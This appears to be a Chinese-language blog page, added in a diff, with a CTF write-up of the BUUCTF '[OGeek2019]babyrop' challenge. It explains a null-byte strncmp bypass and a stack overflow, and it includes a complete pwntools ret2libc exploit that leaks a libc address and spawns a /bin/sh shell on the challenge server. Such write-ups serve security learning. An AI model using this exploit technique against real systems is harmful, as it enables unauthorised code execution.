@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"w11nd.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="BUUCTF[OGeek2019]babyrop">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuctf刷题">
+<meta property="og:url" content="http://w11nd.github.io/2021/04/29/buuctf%E5%88%B7%E9%A2%98/index.html">
+<meta property="og:site_name" content="w11nd">
+<meta property="og:description" content="BUUCTF[OGeek2019]babyrop">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://w11nd.github.io/2021/04/29/buuctf%E5%88%B7%E9%A2%98/main.png">
+<meta property="og:image" content="http://w11nd.github.io/2021/04/29/buuctf%E5%88%B7%E9%A2%98/sub_804871F.png">
+<meta property="og:image" content="http://w11nd.github.io/2021/04/29/buuctf%E5%88%B7%E9%A2%98/sub_80487D0.png">
+<meta property="og:image" content="http://w11nd.github.io/2021/04/29/buuctf%E5%88%B7%E9%A2%98/覆盖v5.png">
+<meta property="article:published_time" content="2021-04-29T09:28:30.000Z">
+<meta property="article:modified_time" content="2021-04-29T13:02:17.343Z">
+<meta property="article:author" content="w11nd">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://w11nd.github.io/2021/04/29/buuctf%E5%88%B7%E9%A2%98/main.png">
+
+<link rel="canonical" href="http://w11nd.github.io/2021/04/29/buuctf%E5%88%B7%E9%A2%98/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>buuctf刷题 | w11nd</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">w11nd</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://w11nd.github.io/2021/04/29/buuctf%E5%88%B7%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="w11nd">
+      <meta itemprop="description" content="菜罢了">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="w11nd">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          buuctf刷题
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-29 17:28:30 / 修改时间：21:02:17" itemprop="dateCreated datePublished" datetime="2021-04-29T17:28:30+08:00">2021-04-29</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><span id="more"></span>
+
+<h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>常规起手看了下checksec ，只开了NX</p>
+<p>ida查看main函数：</p>
+<img src="/2021/04/29/buuctf%E5%88%B7%E9%A2%98/main.png" style="zoom: 80%;">
+
+<h3 id="0x01-关于-dev-urandom"><a href="#0x01-关于-dev-urandom" class="headerlink" title="0x01   关于/dev/urandom"></a>0x01   关于/dev/urandom</h3><p>/dev/urandom (或者/dev/random)是Linux系统中提供的随机伪设备，能够提供永不为空的随机字节数据流。很多解密程序与安全应用程序（如SSH Keys，SSL Keys等）都需要他们提供的随机数据流。</p>
+<p>简单来说其实和rand函数一样。只不过rand函数是伪随机，只要种子（用srand生成）一样，rand得到的序列就不会改变。</p>
+<p>这里buf 写入了 /dev/urandom 中的前四个字节的数据</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>sub_804871E函数：</p>
+<img src="/2021/04/29/buuctf%E5%88%B7%E9%A2%98/sub_804871F.png" style="zoom: 80%;">
+
+<p>因为a1是传入的随机值，所以想到对strncmp检测进行绕过，使得v1=0即可，利用strlen函数，使buf开头为‘\x00’进行截断。</p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>sub_80487D0：</p>
+<img src="/2021/04/29/buuctf%E5%88%B7%E9%A2%98/sub_80487D0.png">
+
+<p>观察到栈大小&lt;255(/xff)，所以再这里能够通过修改a1实现栈溢出，a1是上一个函数的返回值v5</p>
+<img src="/2021/04/29/buuctf%E5%88%B7%E9%A2%98/覆盖v5.png" style="zoom: 150%;">
+
+<p>根据此处给出的偏移对v5进行覆盖，覆盖为’\xff’</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;\x00&#39;+&#39;a&#39;*6+&#39;\xff&#39;</span><br></pre></td></tr></table></figure>
+
+<p>从而构造出exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29838</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>+<span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+]write_addr:&quot;</span>,<span class="built_in">hex</span>(write_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+]libc_base_addr:&quot;</span>,<span class="built_in">hex</span>(libcbase)</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/15/2020hackergame/" rel="prev" title="hackergame2020">
+      <i class="fa fa-chevron-left"></i> hackergame2020
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#BUUCTF"><span class="nav-number">1.</span> <span class="nav-text">BUUCTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#OGeek2019-babyrop"><span class="nav-number">1.1.</span> <span class="nav-text">[OGeek2019]babyrop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00"><span class="nav-number">1.1.1.</span> <span class="nav-text">0x00</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E5%85%B3%E4%BA%8E-dev-urandom"><span class="nav-number">1.1.2.</span> <span class="nav-text">0x01   关于&#x2F;dev&#x2F;urandom</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-number">1.1.3.</span> <span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-number">1.1.4.</span> <span class="nav-text">0x03</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">w11nd</p>
+  <div class="site-description" itemprop="description">菜罢了</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w11nd</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
